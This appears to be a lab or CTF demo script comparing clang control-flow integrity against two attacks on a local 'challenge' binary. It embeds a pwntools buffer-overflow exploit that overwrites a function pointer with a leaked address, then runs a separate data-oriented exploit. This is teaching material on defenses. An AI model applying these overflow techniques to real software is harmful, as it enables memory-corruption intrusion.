#!/usr/bin/env bash
set -u
cd "$(dirname "$0")"

line() { printf '\n\033[1;36m=== %s ===\033[0m\n' "$1"; }

line "0. Build (clang CFI build + plain comparison build)"
make --no-print-directory

line "1. CONTROL-DATA attack: overwrite the code pointer vm.render -> CFI BLOCKS it"
echo '(overflow reaches vm.render, then "render" does an indirect call;'
echo ' clang CFI checks the target type -> trap + abort)'
python3 - <<'PY' 2>&1 | grep -vE "terminfo|Terminal features|Warning:"
from pwn import *
context.arch='amd64'; context.log_level='error'
p=process('./challenge')
p.recvuntil(b'print_flag_fnptr is at '); fnptr=int(p.recvline().strip(),16)
p.recvuntil(b'vm> '); p.sendline(b'name'); p.recvuntil(b'> ')
p.send(b'A'*32 + p64(0xdeadbeef) + p64(fnptr))   # also clobbers vm.render
p.recvuntil(b'vm> '); p.sendline(b'render')
out=p.recvall(timeout=2); p.close()
print("   CFI trap fired? ->", b'control flow integrity' in out)
for l in out.split(b'\n'):
    if b'control flow integrity' in l or b'SUMMARY' in l:
        print("  ", l.decode(errors='replace').strip())
PY

line "2. DOP attack: overwrite ONLY the data pointer vm.ptr -> CFI is BLIND"
echo '(no code pointer touched; we reuse the VM'\''s own emit/next gadgets)'
python3 exploit.py 2>&1 | grep -E "secret_flag|leaked|CFI" | sed 's/^/   /'
